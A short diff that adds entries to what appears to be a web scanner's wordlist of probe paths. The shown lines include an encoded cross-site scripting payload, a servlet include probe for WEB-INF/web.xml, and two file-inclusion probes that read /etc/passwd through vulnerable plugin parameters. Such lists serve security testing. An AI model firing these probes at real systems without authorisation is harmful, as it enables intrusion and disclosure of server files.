@@ -712,3 +712,6 @@
 /index.php?from=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 /{{path}}?javax.servlet.include.servlet_path=/WEB-INF/web.xml
 /cms/collect/getArticle
+/login.jsp
+/plugins/system/cdscriptegrator/libraries/highslide/js/jsloader.php?files[]=/etc/passwd
+/index.php?mod=textviewer&src=file:///etc/passwd
